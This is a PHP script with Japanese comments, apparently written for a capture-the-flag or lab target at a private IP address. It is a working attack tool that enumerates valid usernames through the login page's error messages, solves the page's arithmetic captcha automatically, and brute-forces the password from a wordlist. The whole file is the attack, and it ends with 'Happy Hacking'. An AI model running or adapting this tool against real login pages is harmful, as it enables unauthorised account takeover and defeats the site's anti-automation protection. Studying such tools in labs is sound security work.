  <?php
    echo "------ START -----\n";
    $time_start = microtime(true); //実行開始時間を記録する
    
    // USERNAME.txt PASSWORD,txt 読み込み
    $USERNAME = array();
    $line = file('usernames.txt'); 
    foreach ($line as $line) {
        $line = str_replace(" ", "", $line);
        $line = str_replace("\r", "", $line);
        $line = str_replace("\n", "", $line);
        $USERNAME[] = $line;
    }
    $PASSWORD = array();
    $line = file('passwords.txt'); 
    foreach ($line as $line) {
        $line = str_replace(" ", "", $line);
        $line = str_replace("\r", "", $line);
        $line = str_replace("\n", "", $line);
        $PASSWORD[] = $line;
    }

    // CURL
    function my_curl($username,$password,$captcha){
        $CURLERR = NULL;

        $data = array(
            'username' => $username,
            'password' => $password,
            'captcha'  => $captcha,
        );

        $URL = 'http://10.10.110.220/login';                                // YOUR TARGET IP
        $ch = curl_init($URL);

        curl_setopt($ch, CURLOPT_POST, TRUE);                               //POST
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));      //データをセット
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);                     //受け取ったデータを変数に格納
        $response = curl_exec($ch);

        if(curl_errno($ch)){        //curlでエラー発生
            $CURLERR .= 'curl_errno：' . curl_errno($ch) . "\n";
            $CURLERR .= 'curl_error：' . curl_error($ch) . "\n";
            $CURLERR .= '** curl_getinfo **' . "\n";
            foreach(curl_getinfo($ch) as $key => $val){
                $CURLERR .= '++' . $key . '：' . $val . "\n";
            }
            echo nl2br($CURLERR);
        }
        curl_close($ch);
        //echo $response;
        return $response;
    }

    
    // レスポンスからcaptchaの計算結果返却
    function calc_captcha($res){
        // レスポンス指定なしの場合レスポンスを取得して分割
        if(empty($res)) {
            $line = explode("\n", my_curl("dummy","dummy",""));
        }else{
            $line = explode("\n", $res);
        }

        // ?を含む行を取得
        foreach ($line as $line) {
            //echo $line;
            if (strpos($line,'?')) {
                // 数字取り出し
                $numbersArray = preg_split('/[^0-9]+/', $line, -1, PREG_SPLIT_NO_EMPTY);
                // 演算子取り出し（数字１　演算子　数字２　の順で計算）
                if (strpos($line,'+')){
                    $result = ($numbersArray[0] + $numbersArray[1]);
                }else if(strpos($line,'-')){
                    $result = $numbersArray[0] - $numbersArray[1];
                }else if(strpos($line,'*')){
                    $result = $numbersArray[0] * $numbersArray[1];
                }else if(strpos($line,'/')){
                    $result = $numbersArray[0] / $numbersArray[1];
                }else{
                    echo "ERROR NO MARKS";
                }
                //echo $result;
                return $result;
            }
        }
    }

    // ユーザ特定
    $response = null;
    for ($i = 0; $i < count($USERNAME); $i++) {
        $captcha = calc_captcha($response);
        $response = my_curl($USERNAME[$i],"password",$captcha);
        //echo $response;
        if (strpos($response,'Invalid captcha')) {
            echo "Invalid captcha \n";
            exit;
        }
         if (strpos($response,'does not exist')) {
             //echo ":( [INVALID] CNT:$i USER:$USERNAME[$i]\n";
         }else{
             $user = $USERNAME[$i];
             echo ":) [!!BINGO!!] CNT:$i USER:$user\n";
             break;
         }
    }
    
    // パスワード特定
    $response = null;
    for ($i = 0; $i < count($PASSWORD); $i++) {
        $captcha = calc_captcha($response);
        $response = my_curl($user,$PASSWORD[$i],$captcha);
        //echo $response;
        if (strpos($response,'Invalid captcha')) {
            echo "Invalid captcha \n";
            exit;
        }
         if (strpos($response,'Invalid password')) {
             //echo ":( [INVALID] CNT:$i PASS:$PASSWORD[$i]\n";
         }else{
             $pass = $PASSWORD[$i];
             echo ":) [!!BINGO!!] CNT:$i PASS:$pass\n";
             break;
         }
    }
    
    $time_end = microtime(true);
    $time = $time_end - $time_start;

    echo ":D USER:$user PASS:$pass TIME:$time \n";
    echo "Happy Hacking ! \n ";
    echo "----- END -----";
?>
